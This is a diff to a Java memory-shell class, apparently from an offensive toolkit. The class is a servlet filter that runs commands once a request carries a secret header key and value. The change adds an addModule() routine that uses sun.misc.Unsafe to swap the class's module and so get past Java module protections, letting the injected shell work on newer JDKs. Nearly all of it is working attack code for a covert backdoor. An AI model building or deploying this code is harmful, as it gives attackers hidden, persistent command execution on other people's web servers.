@@ -3,6 +3,9 @@ package com.ppp.middleware.memshell;
 import com.ppp.annotation.JavaClassModifiable;
 import com.ppp.annotation.MemShell;
 import com.ppp.annotation.MemShellFunction;
+import com.ppp.annotation.MemShellType;
+import com.ppp.middleware.loader.SpringInterceptorContextLoader;
+import sun.misc.Unsafe;
 
 import java.io.InputStream;
 import java.lang.reflect.Field;
@@ -15,6 +18,7 @@ import java.lang.reflect.Method;
  */
 @MemShell(MemShell.Filter)
 @MemShellFunction(MemShellFunction.Exec)
+@MemShellType(MemShellType.Default)
 @JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.RHEADER, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
 public class FilterExec implements InvocationHandler {
     private static String HEADER;
@@ -34,6 +38,7 @@ public class FilterExec implements InvocationHandler {
      */
     private void run(Object servletRequest, Object servletResponse, Object filterChain) {
         try {
+            addModule();
             String lv = (String) invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
             if (lv == null || !lv.contains(lockHeaderValue)) {
                 return;
@@ -120,5 +125,24 @@ public class FilterExec implements InvocationHandler {
         method.setAccessible(true);
         Object object = method.invoke(obj, args);
         return object;
+    }
+
+    public static void addModule() {
+        try {
+            Class unsafeClass = Class.forName("sun.misc.Unsafe");
+            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
+            unsafeField.setAccessible(true);
+            Unsafe unsafe = (Unsafe) unsafeField.get(null);
+            Method method = Class.class.getDeclaredMethod("getModule");
+            method.setAccessible(true);
+            Object module = method.invoke(Object.class);
+            Class cls = FilterExec.class;
+            long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
+            Method getAndSetObjectMethod = unsafeClass.getMethod("getAndSetObject", Object.class, long.class, Object.class);
+            getAndSetObjectMethod.setAccessible(true);
+            getAndSetObjectMethod.invoke(unsafe, cls, offset, module);
+        } catch (Exception e) {
+
+        }
     }
 }
